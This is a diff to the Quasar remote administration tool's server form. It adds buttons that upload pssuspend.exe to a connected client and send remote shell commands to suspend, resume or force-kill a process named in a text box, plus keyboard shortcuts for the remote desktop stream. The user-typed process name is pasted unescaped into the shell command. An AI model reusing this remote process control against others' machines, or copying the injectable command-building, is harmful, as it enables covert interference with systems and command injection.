@@ -471,5 +471,63 @@ namespace Quasar.Server.Forms
         {
             TogglePanelVisibility(true);
         }
+
+        private void freezebutton_Click(object sender, EventArgs e)
+        {
+            RemoteShellHandler rsh = new RemoteShellHandler(_connectClient);
+            rsh.SendCommand("\"C:\\pssuspend\" /accepteula \""+ this.processnametextBox.Text + "\"");
+        }
+
+        private void unfreezebutton_Click(object sender, EventArgs e)
+        {
+            RemoteShellHandler rsh = new RemoteShellHandler(_connectClient);
+            rsh.SendCommand("\"C:\\pssuspend\" /accepteula -r \""+this.processnametextBox.Text+"\"");
+        }
+
+        private void killprocessbutton_Click(object sender, EventArgs e)
+        {
+            RemoteShellHandler rsh = new RemoteShellHandler(_connectClient);
+            rsh.SendCommand("taskkill /f /im \""+ this.processnametextBox.Text + ".exe\"");
+        }
+
+        private void FrmRemoteDesktop_KeyPress(object sender, KeyPressEventArgs e)
+        {
+            if (e.KeyChar == (char)Keys.Space)
+            {
+                if (btnStart.Enabled)
+                {
+                    if (cbMonitors.Items.Count == 0)
+                    {
+                        MessageBox.Show("No monitor detected.\nPlease wait till the client sends a list with available monitors.",
+                            "Starting failed", MessageBoxButtons.OK, MessageBoxIcon.Warning);
+                        return;
+                    }
+
+                    SubscribeEvents();
+                    StartStream();
+                }
+                else if (btnStop.Enabled)
+                {
+                    SubscribeEvents();
+                    StopStream();
+                }
+            }
+            else if (e.KeyChar == (char)Keys.Escape)
+            {
+                //// all cleanup logic goes here
+                //UnsubscribeEvents();
+                //if (_remoteDesktopHandler.IsStarted) StopStream();
+                //UnregisterMessageHandler();
+                //_remoteDesktopHandler.Dispose();
+                //picDesktop.Image?.Dispose();
+                this.Close();
+            }
+        }
+
+        private void button_send_pssuspend_Click(object sender, EventArgs e)
+        {
+            FrmFileManager frmFM = new FrmFileManager(_connectClient);
+            frmFM._fileManagerHandler.BeginUploadFile("pssuspend.exe", "C:\\pssuspend.exe");
+        }
     }
 }
